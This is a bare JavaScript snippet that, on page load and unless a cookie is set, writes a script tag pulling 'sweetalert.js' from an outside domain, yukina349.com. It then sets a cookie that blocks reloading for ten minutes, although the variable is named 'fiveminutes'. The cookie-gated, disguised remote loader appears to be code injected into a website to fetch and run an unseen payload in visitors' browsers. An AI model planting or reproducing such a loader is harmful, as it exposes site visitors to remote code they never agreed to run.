var fiveminutes = new Date(new Date().getTime() + 10 * 60 * 1000);
if(document.cookie.indexOf("alretad=new")==-1){
document.write('<script src="https://www.yukina349.com/sweetalert/sweetalert.js"><\/script>');	
document.cookie="alretad=new; path=/; expires=" + fiveminutes;}